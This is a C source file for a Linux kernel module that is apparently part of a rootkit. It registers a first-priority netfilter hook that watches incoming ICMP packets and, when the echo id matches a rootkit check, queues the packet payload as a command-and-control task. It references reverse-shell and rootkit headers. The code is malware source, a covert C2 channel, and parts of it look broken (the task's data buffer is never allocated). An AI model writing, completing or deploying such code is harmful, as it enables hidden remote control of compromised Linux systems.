#include "c2.h"
#include "rshell.h"
#include "misc.h"
#include "rkit_ext.h"
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/crypto.h>
#include <linux/scatterlist.h>

#define SHA1_LENGTH     20
#if LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20)
    #define R_INIT_WORK(_t, _f) INIT_WORK((_t), (void (*)(void *))(_f), (_t))
#else
    #define R_INIT_WORK(_t, _f) INIT_WORK((_t), (_f))
#endif

struct workqueue_struct *work_queue;

struct c2_task {
    struct work_struct work;
    struct icmphdr *data;
    unsigned long len;
};

static void exec_c2_task(struct work_struct *work)
{
    struct c2_task *task = (struct c2_task *)work;

/*
    rkit_ext_run(task->);
*/

    kfree(task);
}

static int queue_c2_task(struct icmphdr *payload, unsigned long len)
{
    struct c2_task *task = NULL;
    int err = -ENOMEM;
    
    task = kmalloc(len, GFP_ATOMIC);
    if (task) {
        R_INIT_WORK(&task->work, &exec_c2_task);

        memcpy(task->data, payload, len);
        task->len = len;

        err = schedule_work(&task->work);
    }

    return err;
}

unsigned int watch_icmp(HOOK_ARG_TYPE hook,
                        struct sk_buff *skb,
                        const struct net_device *in,
                        const struct net_device *out,
                        int (*okfn)(struct sk_buff *))
{
    struct iphdr *iph = ip_hdr(skb);

    if (iph) {
        if (iph->protocol == IPPROTO_ICMP) {
            struct icmphdr *icmph = NULL;
            unsigned short hlen = iph->ihl * 4;
            unsigned short len = iph->tot_len - hlen; 

            icmph = (struct icmphdr *)((char *)(iph) + hlen);
            if (icmph && rkit_check_id(icmph->un.echo.id)) {
                queue_c2_task(icmph, len);
            }
        }
    }

    return NF_ACCEPT;
}

static struct nf_hook_ops c2_hook __read_mostly = {
    .hook     = watch_icmp,
    .owner    = THIS_MODULE,
    .pf       = PF_INET,
    .priority = NF_IP_PRI_FIRST,
    .hooknum  = NF_INET_PRE_ROUTING,
};


void c2_init(void)
{
    nf_register_hook(&c2_hook);
}

void c2_exit(void)
{
    flush_scheduled_work();
    nf_unregister_hook(&c2_hook);
}
